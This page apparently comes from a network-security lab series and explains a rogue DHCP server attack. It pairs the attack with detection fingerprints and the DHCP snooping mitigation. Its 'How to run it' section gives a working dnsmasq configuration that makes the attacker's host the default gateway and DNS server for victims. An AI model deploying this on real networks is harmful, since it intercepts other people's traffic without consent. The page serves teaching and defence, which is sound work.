# Attack 3 — Rogue DHCP server

**ATT&CK:** T1557 Adversary-in-the-Middle
**Mitigation:** [DHCP snooping trust](../mitigations/02-dhcp-snooping.md)

## What it does

DHCP clients accept the first offer they hear, and DHCP has no way to authenticate the server.
Stand up a DHCP server on the segment that answers faster than the real one — or after the
real one has been [starved](02-dhcp-starvation.md) — and clients take the attacker's offer.
The offer sets the attacker's IP as the **default gateway** and the **DNS server**, so from
the client's first packet, all off-subnet traffic and all name resolution flow through the
attacker. It is a man-in-the-middle established at the moment the client boots, before any
session exists to protect.

## How to run it

```bash
# dnsmasq as a rogue server: hand out the attacker as gateway and DNS
cat > /tmp/rogue.conf <<CONF
interface=eth0
dhcp-range=192.168.10.100,192.168.10.200,1h
dhcp-option=3,192.168.10.66     # option 3 = default gateway -> attacker
dhcp-option=6,192.168.10.66     # option 6 = DNS server      -> attacker
CONF
dnsmasq -C /tmp/rogue.conf -d
```

## What you see when it works

A victim that pulls a lease now points its gateway at the attacker:

```
victim> ip route | grep default
  default via 192.168.10.66 dev eth0     # attacker, not the real 192.168.10.1
```

Every off-subnet packet the victim sends arrives at the attacker first.

## The fingerprint it leaves

- **DHCP OFFER packets sourced from an unexpected MAC/port.** There should be exactly one DHCP
  server on the segment, on one known port. A second source of OFFERs is the attack, full stop.
- **In the capture:** filter `dhcp.option.dhcp == 2` (OFFER) and check the source. Two
  different servers offering leases is the signature.
- **DHCP snooping log entries** for offers arriving on an untrusted port — the switch names the
  port, which is where the rogue is plugged in.

## Why it works, in one line

The switch floods DHCP replies from every port equally. DHCP snooping marks exactly one port
as trusted for server messages and drops server messages from all others — so a rogue server's
offers never leave the port it is plugged into.
